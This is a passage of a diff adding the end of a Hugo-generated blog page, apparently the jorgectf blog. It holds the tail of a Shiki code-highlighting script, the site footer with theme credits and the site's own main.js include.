+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
